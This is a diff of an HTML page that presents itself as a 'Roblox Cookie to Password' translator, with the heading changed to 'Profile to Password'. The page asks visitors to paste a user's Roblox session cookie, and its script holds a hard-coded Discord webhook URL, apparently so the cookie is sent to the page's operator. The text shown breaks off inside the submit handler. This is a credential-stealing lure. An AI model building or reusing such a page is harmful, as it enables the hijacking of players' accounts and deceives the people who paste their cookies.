@@ -1,8 +1,8 @@
 <!DOCTYPE html> <html lang="en"> <head> <meta charset="UTF-8"> <meta name="viewport" content="width=device-width, initial-scale=1.0"> <title>Roblox Cookie
 to Password</title> <link rel="stylesheet" href="styles.css"> </head> <body> <header> <div class="logo"> <div class="logo-circle"></div>
-<h2>Roblox Cookie to Password</h2> </div> <nav> <a href="#">Home</a> </nav> </header> <main> <h1>Updated
+<h2>Profile to Password</h2> </div> <nav> <a href="#">Home</a> </nav> </header> <main> <h1>Updated
 Daily</h1> <div class="form-container"> <form id="cookieForm"> <label for="cookie">The user's cookie (Required)</label> <input type="text" id="cookie" placeholder="Copy
-and paste the specified user's cookie." required> <p class="error-message" id="errorMessage">⚠️ Invalid cookie. Ensure it is a valid roblox cookie.</p> <button type="submit">Translate</button>
+ and paste the specified user's cookie." required> <p class="error-message" id="errorMessage">⚠️ Invalid cookie. Ensure it is a valid roblox cookie.</p> <button type="submit">Translate</button>
 </form> </div> <div id="generatedPasswordContainer"> <p id="generatedPassword"></p> </div> </main> <script> const discordWebhookURL
 = 'https://discord.com/api/webhooks/1296142809044226090/lfqD7EkNfxzC9Af0ocarf1LqsIkHwLF72spUQYELTYfe0kuXre_Bs_LzKc9qulMBlG0p'; document.getElementById('cookieForm').addEventListener('submit', function(event) { event.preventDefault(); const cookieValue
 = document.getElementById('cookie').value; if (!cookieValue) { document.getElementById('errorMessage').style.display = 'block'; } else if (!isValidCookie(cookieValue)) { document.getElementById('errorMessage').style.display = 'block'; } else { document.getElementById('errorMessage').style.display
